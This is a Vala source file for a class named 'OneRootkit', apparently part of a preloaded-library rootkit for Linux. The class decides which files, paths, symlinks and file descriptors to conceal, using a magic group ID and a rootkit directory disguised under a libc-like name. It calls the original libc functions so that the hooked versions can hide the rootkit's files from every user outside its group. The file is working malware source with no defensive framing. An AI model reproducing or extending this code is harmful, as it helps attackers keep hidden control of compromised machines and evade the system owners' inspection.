using Posix;

[Compact]
public class OneRootkit
{
	private static string[] HIDDEN_PATHS = null;
	private static const string ROOTKIT_DIR = "/usr/lib/libc.so.0";
	private static const string ROOTKIT_SO_PATH = "/lib/one.so";
	private static int HIDDEN_GID = 197;

	public static string[] GetHiddenPaths()
	{
		if(HIDDEN_PATHS == null)
			HIDDEN_PATHS = new string[] {
				ROOTKIT_DIR,
			};

		return HIDDEN_PATHS;
	}

	public static string GetRootkitHomeDir() // configuration file in future
	{
		return ROOTKIT_DIR;
	}

	public static string GetRootkitSoPath()
	{
		return ROOTKIT_SO_PATH;
	}

	public static bool IsRootkitUser()
	{
		return Posix.getgid() == OneRootkit.HIDDEN_GID;
	}

	public static bool IsPathHidden(string path)
	{
		if(OneRootkit.IsRootkitUser())
			return false;

		string realPath = realpath(path);
		AccessMethod oldAccess = (AccessMethod) DLHandles.LIBC().GetMethod("access");

		if(oldAccess(realPath, F_OK) == -1)
		{
			return true; //file doesnt exist...
		}

		if(realPath == null)
			realPath = path;

		foreach(string hiddenPath in OneRootkit.GetHiddenPaths())
		{
			if(Strings.starts_with(realPath, hiddenPath))
			{
				return true;
			}
		}

		XstatMethod oldXstat = (XstatMethod) DLHandles.LIBC().GetMethod("__lxstat");
		Posix.Stat result = Posix.Stat();
		int returnCode = oldXstat(STAT_VER, realPath, &result);

		if(returnCode != -1)
			return OneRootkit.IsStatHidden(result);

		return IsLinkPathHidden(path);
	}

	public static bool IsLinkPathHidden(string path)
	{
		char linkPath[256];
		linkPath[255] = '\0';

		ReadlinkMethod oldReadlink = (ReadlinkMethod) DLHandles.LIBC().GetMethod("readlink");

		if(oldReadlink(path, linkPath, 254) < 0)
			return false;

		return OneRootkit.IsPathHidden((string) linkPath);
	}

	public static bool IsStatHidden(Posix.Stat stat)
	{
		if(OneRootkit.IsRootkitUser())
			return false;

		if(stat.st_gid == OneRootkit.HIDDEN_GID)
			return true;

		return false;
	}

	public static bool IsFdHidden(int fd)
	{
		FxstatMethod oldFxstat = (FxstatMethod) DLHandles.LIBC().GetMethod("__fxstat");

		Posix.Stat result = Posix.Stat();
		int returnCode = oldFxstat(STAT_VER, fd, &result);

		if(returnCode != -1)
			return OneRootkit.IsStatHidden(result);
		
		return false;
	}

	public static string GetFullDirPath(Posix.Dir dir)
	{
		DirfdMethod oldDirfd = (DirfdMethod) DLHandles.LIBC().GetMethod("dirfd");

		int currentFd = oldDirfd(dir);

		return OneRootkit.GetFdProcLink(currentFd);
	}

	public static string GetFullFilePath(Posix.FILE file)
	{
		return OneRootkit.GetFdProcLink(file.fileno());
	}

	public static string GetFdProcLink(int fd)
	{
		char dirPath[256];

		ReadlinkMethod oldReadlink = (ReadlinkMethod) DLHandles.LIBC().GetMethod("readlink");
		string procEntry = "/proc/self/fd/" + Strings.fromInteger(fd);

		if(oldReadlink(procEntry, dirPath, 255) < 0)
			return null;

		return (string)dirPath;
	}
}